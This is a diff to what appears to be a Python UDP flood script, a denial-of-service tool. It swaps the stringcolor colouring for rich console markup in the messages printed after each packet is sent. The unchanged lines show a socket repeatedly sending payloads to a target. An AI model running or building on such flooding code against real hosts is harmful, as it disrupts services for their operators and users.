@@ -1,12 +1,14 @@
 # Import modules
 import random
 import socket
-from stringcolor import *
+from rich.console import Console
 
-red = "#ff0033"
-green = "#02f93c"
-yellow = "#eefc32"
-blue = "\033[38;5;51m"
+# Define styled print
+print = Console().print
+red = "red3"
+green = "green1"
+yellow = "yellow1"
+blue = "dark_slate_gray2"
 
 # Create socket
 sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
@@ -19,9 +21,12 @@ def flood(target):
             sock.sendto(payload, (target[0], target[1]))
         except Exception as e:
             print(
-                f"\033[1m{cs('[✘] ERROR', red)}\033[0m {cs('while sending UDP packet', yellow)}\n{e}"
+                f"[{red} bold][✘] ERROR[/{red} bold] "
+                + f"[{yellow}]while sending UDP packet[/{yellow}]\n{e}"
             )
         else:
             print(
-                f"{cs(f'[✔] SUCCESS', green)} {cs(f'UDP random packet sent! Payload size:', yellow)} {blue}{len(payload)}\033[0m"
+                f"[{green}][✔] SUCCESS'[/{green}] "
+                + f"[{yellow}]UDP random packet sent! Payload size:[/{yellow}] "
+                + f"[{blue}]{len(payload)}"
             )
